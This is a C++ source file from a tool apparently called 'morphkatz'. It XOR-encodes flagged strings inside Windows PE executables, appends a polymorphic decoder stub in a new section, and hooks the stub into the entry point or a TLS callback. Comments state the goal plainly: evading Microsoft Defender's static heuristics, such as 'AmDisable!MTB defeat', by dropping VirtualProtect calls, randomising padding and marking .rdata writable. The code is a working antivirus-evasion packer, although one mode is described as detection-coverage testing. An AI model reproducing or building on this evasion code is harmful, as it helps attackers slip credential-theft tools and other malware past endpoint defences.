#include "morphkatz/datapass/pass.hpp"

#include "morphkatz/common/logging.hpp"
#include "morphkatz/datapass/decoder_stub.hpp"
#include "morphkatz/format/pe_image.hpp"
#include "morphkatz/format/pe_reloc.hpp"
#include "morphkatz/format/pe_section_appender.hpp"
#include "morphkatz/format/pe_tls.hpp"

#include <cstring>

namespace morphkatz::datapass {

namespace {

inline uint16_t r16(std::span<const uint8_t> p, size_t o) noexcept {
    return static_cast<uint16_t>(p[o]) |
           (static_cast<uint16_t>(p[o + 1]) << 8);
}
inline uint32_t r32(std::span<const uint8_t> p, size_t o) noexcept {
    return static_cast<uint32_t>(p[o]) |
           (static_cast<uint32_t>(p[o + 1]) << 8) |
           (static_cast<uint32_t>(p[o + 2]) << 16) |
           (static_cast<uint32_t>(p[o + 3]) << 24);
}

// Walk every section in the PE and convert a file offset to its RVA.
// Returns UINT32_MAX on miss.
uint32_t file_to_rva(std::span<const uint8_t> pe, uint64_t file_offset) noexcept {
    if (pe.size() < 0x40) return UINT32_MAX;
    const uint32_t e_lfanew = r32(pe, 0x3c);
    if (e_lfanew + 24 > pe.size()) return UINT32_MAX;
    if (pe[e_lfanew]     != 'P' || pe[e_lfanew + 1] != 'E' ||
        pe[e_lfanew + 2] != 0   || pe[e_lfanew + 3] != 0) {
        return UINT32_MAX;
    }
    const size_t coff = e_lfanew + 4;
    if (coff + 20 > pe.size()) return UINT32_MAX;
    const uint16_t num_sections = r16(pe, coff + 2);
    const uint16_t opt_size     = r16(pe, coff + 16);
    const size_t   opt_off      = coff + 20;
    const size_t   sect_off     = opt_off + opt_size;
    if (sect_off + size_t(num_sections) * 40 > pe.size()) return UINT32_MAX;

    for (uint16_t i = 0; i < num_sections; ++i) {
        const size_t off = sect_off + size_t(i) * 40;
        const uint32_t va  = r32(pe, off + 12);
        const uint32_t rsz = r32(pe, off + 16);
        const uint32_t rp  = r32(pe, off + 20);
        if (rp == 0 || rsz == 0) continue;
        if (file_offset >= rp && file_offset < uint64_t(rp) + rsz) {
            return va + static_cast<uint32_t>(file_offset - rp);
        }
    }
    return UINT32_MAX;
}

// Read the original AddressOfEntryPoint; we need it because the stub
// jumps back to it after decoding.
uint32_t read_original_aep(std::span<const uint8_t> pe) noexcept {
    if (pe.size() < 0x40) return 0;
    const uint32_t e_lfanew = r32(pe, 0x3c);
    if (e_lfanew + 24 > pe.size()) return 0;
    const size_t opt = e_lfanew + 24;
    if (opt + 20 > pe.size()) return 0;
    return r32(pe, opt + 16);
}

// OR `IMAGE_SCN_MEM_WRITE` (0x80000000) into the PE Characteristics
// field of every section that contains at least one of the supplied
// atoms (matched by file_offset against [PointerToRawData,
// PointerToRawData + SizeOfRawData)).
//
// The v2 stub does not call VirtualProtect; instead it relies on the
// loader mapping atom-bearing sections RW from the start. A section
// that's loaded read-only (typical for .rdata) would page-fault on
// the stub's first XOR write. This helper makes the loader map the
// page RW so the stub can write through unobstructed.
//
// The trade-off: a writable .rdata is technically anomalous for a
// "well-behaved" program. mpengine's static heuristic family does not
// (as of Engine 1.1.26030+) score "writable .rdata" by itself, so we
// are net-positive vs the v1 stub which paid for runtime VP calls.
//
// `out_sections` (if non-null) receives the names of the sections
// touched, for the report / log.
Result<std::vector<std::string>>
mark_atom_sections_writable(format::PeImage&      image,
                            std::span<const Atom> atoms) {
    auto& buf = image.buffer();
    if (buf.size() < 0x40) {
        return Error::make(ErrorKind::ParseFormat,
            "mark_atom_sections_writable: image too small");
    }
    const uint32_t e_lfanew = r32(buf, 0x3c);
    if (e_lfanew + 24 > buf.size() ||
        buf[e_lfanew]     != 'P' || buf[e_lfanew + 1] != 'E' ||
        buf[e_lfanew + 2] != 0   || buf[e_lfanew + 3] != 0) {
        return Error::make(ErrorKind::ParseFormat,
            "mark_atom_sections_writable: invalid PE header");
    }
    const size_t coff = e_lfanew + 4;
    if (coff + 20 > buf.size()) {
        return Error::make(ErrorKind::ParseFormat,
            "mark_atom_sections_writable: COFF header truncated");
    }
    const uint16_t num_sections = r16(buf, coff + 2);
    const uint16_t opt_size     = r16(buf, coff + 16);
    const size_t   opt_off      = coff + 20;
    const size_t   sect_off     = opt_off + opt_size;
    if (sect_off + size_t(num_sections) * 40 > buf.size()) {
        return Error::make(ErrorKind::ParseFormat,
            "mark_atom_sections_writable: section table truncated");
    }

    // Build a quick "section index -> already-marked?" map so we don't
    // touch the same section twice and so we can return the touched
    // names in section-table order.
    std::vector<bool>        touched(num_sections, false);
    std::vector<std::string> names;

    for (const auto& a : atoms) {
        for (uint16_t i = 0; i < num_sections; ++i) {
            const size_t   off = sect_off + size_t(i) * 40;
            const uint32_t rsz = r32(buf, off + 16);
            const uint32_t rp  = r32(buf, off + 20);
            if (rp == 0 || rsz == 0) continue;
            if (a.file_offset >= rp &&
                a.file_offset <  uint64_t(rp) + rsz) {
                if (touched[i]) break;
                touched[i] = true;
                // Read-modify-write the 32-bit Characteristics field
                // at section_header + 36.
                const size_t chars_off = off + 36;
                uint32_t chars = r32(buf, chars_off);
                if ((chars & format::SectionChars::kMemWrite) == 0) {
                    chars |= format::SectionChars::kMemWrite;
                    for (int b = 0; b < 4; ++b) {
                        buf[chars_off + size_t(b)] =
                            static_cast<uint8_t>((chars >> (8 * b)) & 0xff);
                    }
                }
                // Capture the section name (bytes 0..7, NUL-terminated).
                std::string n;
                n.reserve(8);
                for (int k = 0; k < 8; ++k) {
                    const auto c = static_cast<char>(buf[off + size_t(k)]);
                    if (c == 0) break;
                    n.push_back(c);
                }
                names.push_back(std::move(n));
                break;
            }
        }
    }
    return names;
}

}  // namespace

namespace {

// Decision result from `decide_placement`: which path the caller
// should drive. The TLS path is only taken when (a) the user asked
// for it (or Auto) AND (b) the target binary actually has an
// IMAGE_DIRECTORY_ENTRY_TLS we can extend, AND (c) we have enough
// reloc slack to add a single-page block for the new callback array.
enum class Placement { TlsCallback, EpThunk };

}  // namespace

Result<DataPassReport>
run_data_pass(format::PeImage&      image,
              std::span<const Atom> atoms,
              const DataPassConfig& cfg) {
    DataPassReport rep;
    if (atoms.empty()) {
        rep.skip_reason = "no atoms to encode";
        rep.decoder_placement = "skipped";
        return rep;
    }

    // ----------- EncodeOnly fast-path: XOR atoms in place; stop. ------
    //
    // No section append, no stub, no entry-point patch. The output is a
    // file-scan-clean binary by construction (we only modify .rdata /
    // .data bytes that were already flagged as triggers) but is NOT
    // runnable - no decoder will ever undo the XOR. This mode is
    // documented in docs/data-morph.md as the "detection-engineering
    // coverage" artifact and the README's --data-morph encode-only.
    if (cfg.mode == PassMode::EncodeOnly) {
        auto& buf = image.buffer();
        const uint8_t key_byte = static_cast<uint8_t>(cfg.xor_key & 0xff);
        uint64_t total_bytes = 0;
        for (const auto& a : atoms) {
            if (a.file_offset + a.length > buf.size()) {
                return Error::make(ErrorKind::Invalid,
                    "data-morph: atom extends past EOF");
            }
            for (uint32_t j = 0; j < a.length; ++j) {
                buf[a.file_offset + j] ^= key_byte;
            }
            total_bytes += a.length;
        }
        rep.encoded             = true;
        rep.atoms_encoded       = static_cast<uint32_t>(atoms.size());
        rep.morph_section_size  = 0;
        rep.morph_section_rva   = 0;
        rep.entry_point_changed = false;
        rep.decoder_placement   = "encode_only";
        MK_INFO("data-morph encode-only: XOR-encoded {} atom(s) across "
                "{} bytes; no decoder stub appended; output will NOT "
                "execute correctly (this is intentional for static "
                "detection-coverage testing - never ship the result "
                "as a runnable artifact).",
                 atoms.size(), total_bytes);
        return rep;
    }

    // ----------- 1) (v2 stub: no VirtualProtect lookup needed) -------
    //
    // The pre-A.1 v1 stub bracketed the XOR loop with two VirtualProtect
    // calls (PAGE_READWRITE -> XOR -> restore) so it could write into
    // read-only .rdata at runtime. mpengine's `AmDisable` static family
    // scored that macro shape as multiple weak signals summed above the
    // `!MTB` threshold even after the atoms themselves were XOR-ed away
    // (see project transcript & internal research notes).
    //
    // The v2 stub instead asks the loader to map the atom-bearing
    // sections RW from the start (see mark_atom_sections_writable
    // below). That collapses the stub down to just the inner XOR loop -
    // no imported APIs, no PAGE_READWRITE constant, no return-prot
    // restore - which on its own has not been observed to fire the
    // heuristic. So we no longer need the kernel32!VirtualProtect IAT
    // entry, and a missing one is no longer fatal.

    // ----------- 2) Decide placement (TLS preferred when feasible) --
    Placement placement = Placement::EpThunk;
    format::TlsState tls_state;
    if (cfg.placement == DecoderPlacement::TlsCallback ||
        cfg.placement == DecoderPlacement::Auto) {
        auto tls_r = format::inspect_tls(image);
        if (tls_r.ok() && tls_r->has_directory) {
            tls_state = std::move(*tls_r);
            placement = Placement::TlsCallback;
            MK_DEBUG("data-morph: TLS directory present "
                     "({} existing callback(s)); preferring TLS placement",
                      tls_state.existing_callbacks.size());
        } else {
            if (!tls_r.ok()) {
                MK_DEBUG("data-morph: inspect_tls failed: {}; "
                         "falling back to EP-thunk",
                          tls_r.error().what);
            }
            if (cfg.placement == DecoderPlacement::TlsCallback) {
                MK_WARN("data-morph: --decoder-placement tls_callback "
                        "requested but PE has no TLS directory; "
                        "falling back to EP-thunk");
            }
        }
    }

    // ----------- 3) Build the (unfinalized) decoder stub -------------
    //
    // `pad_seed` drives the stub's polymorphic NOP padding (see
    // include/morphkatz/datapass/decoder_stub.hpp). We derive it from
    // the same seed-derived `xor_key`, salted with a constant so the
    // pad RNG state diverges from the XOR key on the first call to
    // splitmix64 inside the builder. A non-zero pad_seed is essential
    // for `AmDisable!MTB` defeat: without it the stub's instructions
    // land at the exact byte offsets the heuristic anchors against.
    const uint64_t pad_seed =
        (uint64_t(cfg.xor_key) * 0xC2B2AE3D27D4EB4Full) ^ 0xA5A5C3C3DEADBEEFull;
    auto stub_r = (placement == Placement::TlsCallback)
        ? build_decoder_stub_tls_callback(atoms, cfg.xor_key, pad_seed)
        : build_decoder_stub_ep_thunk(atoms, cfg.xor_key, pad_seed);
    if (!stub_r.ok()) return stub_r.error();
    auto stub = std::move(*stub_r);

    // ----------- 4) Save original entry point ------------------------
    const uint32_t original_aep = read_original_aep(image.bytes());
    if (original_aep == 0 && placement == Placement::EpThunk) {
        return Error::make(ErrorKind::ParseFormat,
            "data-morph: original AddressOfEntryPoint is zero; "
            "this PE has no entry point and EP-thunk placement "
            "is not viable");
    }

    // ----------- 5) Translate atom file_offsets to RVAs --------------
    // We do this BEFORE appending the section so the section-table
    // walk in `file_to_rva` sees the original layout. The atoms are
    // strictly inside .rdata/.data per the discovery filter.
    std::vector<uint32_t> atom_rvas;
    atom_rvas.reserve(atoms.size());
    for (const auto& a : atoms) {
        const uint32_t rva = file_to_rva(image.bytes(), a.file_offset);
        if (rva == UINT32_MAX) {
            return Error::make(ErrorKind::Invalid,
                "data-morph: atom at file_offset 0x" +
                std::to_string(a.file_offset) +
                " not mapped to any RVA");
        }
        atom_rvas.push_back(rva);
    }

    // ----------- 5) Encode atoms on disk (XOR with key low byte) ------
    {
        auto& buf = image.buffer();
        const uint8_t key_byte = static_cast<uint8_t>(cfg.xor_key & 0xff);
        for (size_t i = 0; i < atoms.size(); ++i) {
            const auto& a = atoms[i];
            if (a.file_offset + a.length > buf.size()) {
                return Error::make(ErrorKind::Invalid,
                    "data-morph: atom extends past EOF");
            }
            for (uint32_t j = 0; j < a.length; ++j) {
                buf[a.file_offset + j] ^= key_byte;
            }
        }
    }

    // ----------- 6) Append the .morph section ------------------------
    //
    // For TLS placement we also need to append the new callback array
    // (one VA per callback + null terminator). We lay it out right
    // after the stub bytes (page-aligned-friendly), inside the same
    // section. The reloc table will get one entry per VA slot.
    constexpr uint32_t kChars = format::SectionChars::kCntCode |
                                format::SectionChars::kMemRead |
                                format::SectionChars::kMemExecute |
                                format::SectionChars::kCntInitData;

    std::vector<uint8_t> section_payload(stub.bytes.begin(), stub.bytes.end());
    uint32_t tls_array_offset_in_section = 0;
    format::TlsArrayLayout tls_layout{};
    if (placement == Placement::TlsCallback) {
        // Pad to 8-byte alignment so the array of 8-byte VAs is aligned.
        while ((section_payload.size() & 7) != 0) {
            section_payload.push_back(0xCC);
        }
        // Our callback's VA = image_base + section_rva + entry_point_offset.
        // We don't know section_rva yet, so we fix it up after append_section.
        tls_layout = format::plan_tls_callback_array(tls_state,
                                                     /*placeholder*/ 0);
        tls_array_offset_in_section = static_cast<uint32_t>(section_payload.size());
        section_payload.insert(section_payload.end(),
                               tls_layout.bytes.begin(),
                               tls_layout.bytes.end());
    }

    auto sect_r = format::append_section(image, cfg.section_name,
                                         section_payload, kChars);
    if (!sect_r.ok()) {
        rep.skip_reason       = sect_r.error().what;
        rep.decoder_placement = "skipped";
        MK_WARN("data-morph: append_section failed: {}", rep.skip_reason);
        // Best-effort rollback of XOR encoding so the binary stays
        // runnable when the user re-runs without --data-morph.
        auto& buf = image.buffer();
        const uint8_t key_byte = static_cast<uint8_t>(cfg.xor_key & 0xff);
        for (const auto& a : atoms) {
            if (a.file_offset + a.length > buf.size()) continue;
            for (uint32_t j = 0; j < a.length; ++j) {
                buf[a.file_offset + j] ^= key_byte;
            }
        }
        return rep;
    }
    const auto& sect = *sect_r;

    // ----------- 6b) Mark atom-bearing sections IMAGE_SCN_MEM_WRITE --
    //
    // The v2 stub will XOR-write into these pages at startup. Without
    // the W flag the loader maps them as RX/R-only and the very first
    // `mov [rcx+r10], r11b` page-faults the process. Done after
    // append_section so any failure here doesn't leave us with an
    // unmodified PE that nevertheless has the encoded atoms (we'd
    // rather propagate the parse error).
    {
        auto names_r = mark_atom_sections_writable(image, atoms);
        if (!names_r.ok()) return names_r.error();
        if (!names_r->empty()) {
            std::string joined;
            for (size_t i = 0; i < names_r->size(); ++i) {
                if (i) joined.append(", ");
                joined.append((*names_r)[i]);
            }
            MK_DEBUG("data-morph: marked section(s) IMAGE_SCN_MEM_WRITE: {}",
                     joined);
        }
    }

    // ----------- 7) Finalize stub: write the displacements -----------
    //
    // Only three slots have non-zero offsets in the v2 stub
    // (lea_imagebase, lea_dir, jmp_orig). The legacy call_vp_*
    // offsets are reported as 0 by the builder; finalize_stub treats
    // a 0 offset as "no slot here" and skips the write.
    StubFixups fx{};
    fx.lea_imagebase_off = stub.patch.lea_imagebase_imm32;
    fx.lea_dir_off       = stub.patch.lea_dir_imm32;
    fx.call_vp_off_1     = stub.patch.call_vp_imm32_1st;     // 0 in v2
    fx.call_vp_off_2     = stub.patch.call_vp_imm32_2nd;     // 0 in v2
    fx.jmp_orig_off      = stub.patch.jmp_orig_imm32;        // 0 for TLS variant

    // RIP-relative displacement = target_rva - rip_after_imm
    // For each instruction site, rip_after_imm = stub_rva + imm_off + 4.
    const auto disp = [&](uint32_t imm_off, uint32_t target_rva) -> int32_t {
        const uint32_t rip_after = sect.virtual_addr + imm_off + 4;
        return static_cast<int32_t>(target_rva) -
               static_cast<int32_t>(rip_after);
    };
    // ImageBase lives at RVA 0; the LEA derives it as `rip_after + disp`.
    fx.imagebase_disp_imm = disp(stub.patch.lea_imagebase_imm32,
                                  /*target_rva=*/0);
    fx.dir_offset_imm    = disp(stub.patch.lea_dir_imm32,
                                 sect.virtual_addr + stub.dir_offset);
    // No VirtualProtect calls in v2; leave vp_iat_offset_*  at 0. The
    // matching `*_off` fields are 0 too, so finalize_stub skips them.
    if (stub.patch.jmp_orig_imm32 != 0) {
        fx.jmp_orig_imm = disp(stub.patch.jmp_orig_imm32, original_aep);
    }

    // ----------- 8) Patch stub bytes inside the section payload ------
    auto& buf = image.buffer();
    if (sect.raw_offset + stub.bytes.size() > buf.size()) {
        return Error::make(ErrorKind::Invalid,
            "data-morph: appended section bytes truncated");
    }
    auto stub_view = std::span<uint8_t>{ buf.data() + sect.raw_offset,
                                          stub.bytes.size() };

    if (auto r = finalize_stub(stub_view, fx); !r.ok()) {
        return r.error();
    }

    // ----------- 9) Fill DirEntry::target_rva for each atom ----------
    for (size_t i = 0; i < atoms.size(); ++i) {
        const uint32_t entry_off = stub.dir_entry_offsets[i];
        // entry layout: target_rva (4) + length (4)
        const uint32_t rva = atom_rvas[i];
        std::memcpy(stub_view.data() + entry_off, &rva, 4);
    }

    // ----------- 10) Install decoder hook ---------------------------
    const uint32_t stub_rva = sect.virtual_addr + stub.entry_point_offset;
    uint32_t ep_rva_for_log = stub_rva;
    if (placement == Placement::TlsCallback) {
        // 10a. Compute image-based VAs for: our callback, the new array slots.
        const uint64_t image_base = image.image_base();
        const uint64_t our_cb_va  = image_base + stub_rva;
        const uint32_t array_rva  = sect.virtual_addr + tls_array_offset_in_section;
        const uint64_t array_va   = image_base + array_rva;

        // 10b. Re-write the callback array in the appended bytes with the
        //      now-resolved VAs (we wrote zero placeholders earlier).
        if (sect.raw_offset + tls_array_offset_in_section +
            tls_layout.bytes.size() > buf.size()) {
            return Error::make(ErrorKind::Invalid,
                "data-morph: TLS array bytes truncated in image");
        }
        std::span<uint8_t> arr_view{
            buf.data() + sect.raw_offset + tls_array_offset_in_section,
            tls_layout.bytes.size() };
        // First slot = our callback VA, then existing callbacks, then 0.
        auto write_va = [&](size_t idx, uint64_t v) {
            for (int b = 0; b < 8; ++b) {
                arr_view[idx * 8 + size_t(b)] =
                    static_cast<uint8_t>((v >> (8 * b)) & 0xff);
            }
        };
        write_va(0, our_cb_va);
        for (size_t i = 0; i < tls_state.existing_callbacks.size(); ++i) {
            write_va(i + 1, tls_state.existing_callbacks[i]);
        }
        write_va(tls_state.existing_callbacks.size() + 1, 0);

        // 10c. Add base relocations for every non-null VA slot.
        std::vector<uint32_t> reloc_targets;
        reloc_targets.reserve(1 + tls_state.existing_callbacks.size());
        for (uint32_t i = 0;
             i < 1 + tls_state.existing_callbacks.size();
             ++i) {
            reloc_targets.push_back(array_rva + i * 8);
        }

        // Try to add the relocations. If it fails (no slack in .reloc),
        // we fall back to EP-thunk by reverting the AddressOfCallBacks
        // change (we haven't done that yet) and re-finalizing as EP-thunk.
        // For simplicity in v1, we propagate the failure: the caller will
        // see decoder_placement="skipped" and skip_reason explaining why.
        if (auto r = format::add_dir64_relocations(image, reloc_targets);
            !r.ok()) {
            MK_WARN("data-morph: TLS placement infeasible (reloc grow "
                    "failed: {}); treating pass as failed and leaving "
                    "AddressOfEntryPoint untouched", r.error().what);
            rep.skip_reason = "tls reloc grow failed: " + r.error().what;
            rep.decoder_placement = "skipped";
            return rep;
        }

        // 10d. Patch IMAGE_TLS_DIRECTORY64.AddressOfCallBacks -> array_va.
        if (auto r = format::patch_address_of_callbacks(image, array_va);
            !r.ok()) {
            rep.skip_reason = "patch AddressOfCallBacks failed: " +
                              r.error().what;
            rep.decoder_placement = "skipped";
            return rep;
        }
        rep.decoder_placement = "tls_callback";
        rep.entry_point_changed = false;
        ep_rva_for_log = stub_rva;
    } else {
        // 10e. EP-thunk path: patch AddressOfEntryPoint to point at the stub.
        if (auto r = image.set_entry_point_rva(stub_rva); !r.ok()) {
            return r.error();
        }
        rep.decoder_placement = "ep_thunk";
        rep.entry_point_changed = true;
        ep_rva_for_log = stub_rva;
    }

    rep.encoded            = true;
    rep.atoms_encoded      = static_cast<uint32_t>(atoms.size());
    rep.morph_section_size = sect.raw_size;
    rep.morph_section_rva  = sect.virtual_addr;

    uint64_t total_atom_bytes = 0;
    for (const auto& a : atoms) total_atom_bytes += a.length;
    MK_INFO("data-morph: encoded {} atom(s) across {} bytes; "
            "appended {} (RVA 0x{:x}, raw 0x{:x}); placement={}; "
            "stub @ 0x{:x}",
             atoms.size(), total_atom_bytes,
             cfg.section_name, sect.virtual_addr, sect.raw_offset,
             rep.decoder_placement, ep_rva_for_log);
    return rep;
}

}
